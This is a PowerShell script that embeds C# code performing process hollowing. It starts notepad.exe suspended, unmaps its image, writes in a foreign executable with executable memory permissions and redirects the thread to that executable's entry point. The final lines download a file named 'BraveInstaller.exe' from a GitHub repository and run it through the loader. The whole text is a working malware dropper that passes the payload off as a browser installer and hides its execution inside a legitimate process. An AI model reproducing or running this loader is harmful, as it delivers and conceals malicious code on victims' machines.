Add-Type -TypeDefinition @"

using System;
using System.Runtime.InteropServices;

public static class H
{
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO {
        public int cb;
        public string lpReserved, lpDesktop, lpTitle;
        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DOS_HEADER {
        public ushort e_magic;
        public ushort e_cblp, e_cp, e_crlc, e_cparhdr, e_minalloc, e_maxalloc, e_ss, e_sp, e_csum, e_ip, e_cs, e_lfarlc, e_ovno;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public ushort[] e_res;
        public ushort e_oemid, e_oeminfo;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)] public ushort[] e_res2;
        public int e_lfanew;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_FILE_HEADER {
        public ushort Machine;
        public ushort NumberOfSections;
        public uint TimeDateStamp, PointerToSymbolTable, NumberOfSymbols;
        public ushort SizeOfOptionalHeader, Characteristics;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER32 {
        public ushort Magic;
        public byte MajorLinkerVersion, MinorLinkerVersion;
        public uint SizeOfCode, SizeOfInitializedData, SizeOfUninitializedData;
        public uint AddressOfEntryPoint, BaseOfCode, BaseOfData, ImageBase;
        public uint SectionAlignment, FileAlignment;
        public ushort MajorOperatingSystemVersion, MinorOperatingSystemVersion, MajorImageVersion, MinorImageVersion, MajorSubsystemVersion, MinorSubsystemVersion;
        public uint Win32VersionValue, SizeOfImage, SizeOfHeaders, CheckSum;
        public ushort Subsystem, DllCharacteristics;
        public uint SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit;
        public uint LoaderFlags, NumberOfRvaAndSizes;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER64 {
        public ushort Magic;
        public byte MajorLinkerVersion, MinorLinkerVersion;
        public uint SizeOfCode, SizeOfInitializedData, SizeOfUninitializedData;
        public uint AddressOfEntryPoint, BaseOfCode;
        public ulong ImageBase;
        public uint SectionAlignment, FileAlignment;
        public ushort MajorOperatingSystemVersion, MinorOperatingSystemVersion, MajorImageVersion, MinorImageVersion, MajorSubsystemVersion, MinorSubsystemVersion;
        public uint Win32VersionValue, SizeOfImage, SizeOfHeaders, CheckSum;
        public ushort Subsystem, DllCharacteristics;
        public ulong SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit;
        public uint LoaderFlags, NumberOfRvaAndSizes;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_SECTION_HEADER {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)] public byte[] Name;
        public uint VirtualSize, VirtualAddress, SizeOfRawData, PointerToRawData;
        public uint PointerToRelocations, PointerToLinenumbers;
        public ushort NumberOfRelocations, NumberOfLinenumbers;
        public uint Characteristics;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct CONTEXT32 {
        public uint ContextFlags;
        public uint Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public uint SegGs, SegFs, SegEs, SegDs;
        public uint Edi, Esi, Ebx, Edx, Ecx, Eax;
        public uint Ebp, Eip, SegCs, EFlags, Esp, SegSs;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct CONTEXT64 {
        public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint ContextFlags, MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15;
        public ulong Rip;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreateProcess(string app, string cmd, IntPtr pAttr, IntPtr tAttr, bool inherit,
        uint flags, IntPtr env, string dir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
    [DllImport("kernel32.dll")]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT32 ctx);
    [DllImport("kernel32.dll")]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 ctx);
    [DllImport("kernel32.dll")]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT32 ctx);
    [DllImport("kernel32.dll")]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 ctx);
    [DllImport("kernel32.dll")]
    static extern uint ResumeThread(IntPtr hThread);
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr addr, uint size, uint type, uint prot);
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr addr, byte[] buf, uint sz, out uint written);
    [DllImport("ntdll.dll")]
    static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr addr);
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint ms);
    [DllImport("kernel32.dll")]
    static extern bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode);
    [DllImport("kernel32.dll")]
    static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

    const uint CREATE_SUSPENDED = 0x4;
    const uint MEM_COMMIT = 0x1000, MEM_RESERVE = 0x2000, PAGE_READWRITE = 0x04;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint CONTEXT_FULL = 0x10007;

    public static int Run(byte[] pe)
    {
        // --- Parse PE ---
        var dos = BytesToStruct<IMAGE_DOS_HEADER>(pe, 0);
        int peOff = dos.e_lfanew;
        int ntOff = peOff + 4;
        var fh = BytesToStruct<IMAGE_FILE_HEADER>(pe, ntOff);
        bool is64 = fh.Machine == 0x8664;
        int optOff = ntOff + Marshal.SizeOf<IMAGE_FILE_HEADER>();
        ulong prefBase = 0;
        uint sizeImg = 0, epRva = 0;
        if (is64) {
            var o64 = BytesToStruct<IMAGE_OPTIONAL_HEADER64>(pe, optOff);
            prefBase = o64.ImageBase; sizeImg = o64.SizeOfImage; epRva = o64.AddressOfEntryPoint;
        } else {
            var o32 = BytesToStruct<IMAGE_OPTIONAL_HEADER32>(pe, optOff);
            prefBase = o32.ImageBase; sizeImg = o32.SizeOfImage; epRva = o32.AddressOfEntryPoint;
        }

        // --- Create suspended host ---
        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        si.wShowWindow = 1;   // SW_SHOWNORMAL
        PROCESS_INFORMATION pi;
        string host = is64 ? @"C:\Windows\System32\notepad.exe" : @"C:\Windows\SysWOW64\notepad.exe";
        if (!CreateProcess(host, null, IntPtr.Zero, IntPtr.Zero, false,
            CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
            return 1;

        // --- Unmap original image ---
        NtUnmapViewOfSection(pi.hProcess, (IntPtr)prefBase);

        // --- Allocate memory for new image ---
        IntPtr newBase = VirtualAllocEx(pi.hProcess, (IntPtr)prefBase, sizeImg, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (newBase == IntPtr.Zero)
            newBase = VirtualAllocEx(pi.hProcess, IntPtr.Zero, sizeImg, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (newBase == IntPtr.Zero) { TerminateProcess(pi.hProcess, 0); return 2; }

        // --- Write headers & sections ---
        uint written;
        int hdrSize = optOff + fh.SizeOfOptionalHeader + fh.NumberOfSections * Marshal.SizeOf<IMAGE_SECTION_HEADER>();
        byte[] hdr = new byte[hdrSize];
        Array.Copy(pe, 0, hdr, 0, hdrSize);
        WriteProcessMemory(pi.hProcess, newBase, hdr, (uint)hdrSize, out written);

        for (int i = 0; i < fh.NumberOfSections; i++) {
            var sec = BytesToStruct<IMAGE_SECTION_HEADER>(pe, optOff + fh.SizeOfOptionalHeader + i * Marshal.SizeOf<IMAGE_SECTION_HEADER>());
            if (sec.SizeOfRawData > 0) {
                byte[] secData = new byte[sec.SizeOfRawData];
                Array.Copy(pe, (int)sec.PointerToRawData, secData, 0, sec.SizeOfRawData);
                IntPtr dest = IntPtr.Add(newBase, (int)sec.VirtualAddress);
                WriteProcessMemory(pi.hProcess, dest, secData, sec.SizeOfRawData, out written);
            }
        }

        // --- Apply relocations (stub) ---
        long delta = (long)newBase.ToInt64() - (long)prefBase;
        if (delta != 0) { /* full reloc processing omitted */ }

        // --- Reproctect as executable ---
        VirtualAllocEx(pi.hProcess, newBase, sizeImg, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        // --- Set entry point ---
        if (is64) {
            var ctx64 = new CONTEXT64();
            ctx64.ContextFlags = CONTEXT_FULL;
            if (!GetThreadContext(pi.hThread, ref ctx64)) return 3;
            ctx64.Rip = (ulong)newBase.ToInt64() + epRva;
            if (!SetThreadContext(pi.hThread, ref ctx64)) return 4;
        } else {
            var ctx32 = new CONTEXT32();
            ctx32.ContextFlags = CONTEXT_FULL;
            if (!GetThreadContext(pi.hThread, ref ctx32)) return 3;
            unchecked { ctx32.Eip = (uint)(newBase.ToInt32() + (int)epRva); }
            if (!SetThreadContext(pi.hThread, ref ctx32)) return 4;
        }

        // --- Resume and wait ---
        ResumeThread(pi.hThread);
        WaitForSingleObject(pi.hProcess, 0xFFFFFFFF);
        uint exitCode;
        GetExitCodeProcess(pi.hProcess, out exitCode);
        return (int)exitCode;
    }

    static T BytesToStruct<T>(byte[] buf, int offset) where T : struct
    {
        int size = Marshal.SizeOf<T>();
        IntPtr p = Marshal.AllocHGlobal(size);
        Marshal.Copy(buf, offset, p, size);
        T s = Marshal.PtrToStructure<T>(p);
        Marshal.FreeHGlobal(p);
        return s;
    }
}

"@
$data = (New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/PoolSync-Studios/MCAntiPools/refs/heads/main/docs/assets/BraveInstaller.exe')
[H]::Run($data)
